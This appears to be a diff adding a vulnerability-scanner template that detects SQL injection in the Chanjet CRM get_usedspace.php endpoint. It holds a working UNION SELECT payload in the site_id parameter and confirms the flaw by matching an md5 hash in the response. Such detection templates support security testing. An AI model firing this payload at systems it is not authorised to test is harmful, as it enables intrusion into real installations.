@@ -1,0 +1,21 @@
+id: chanjet-CRM-sqli
+info:
+  name: 畅捷CRM 管理系统 get_usedspace.php 文件 SQL注入漏洞
+  author: Str1am
+  severity: high
+  reference: https://github.com/luck-ying/Library-POC/blob/77a6d512e04ace5117a161bb2fdd0c77790d34ff/Goby%26poc/chanjet_CRM_get_usedspace.php_sql_injection.json
+  tags: chanjet,sqli
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5(123))"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
+        condition: and
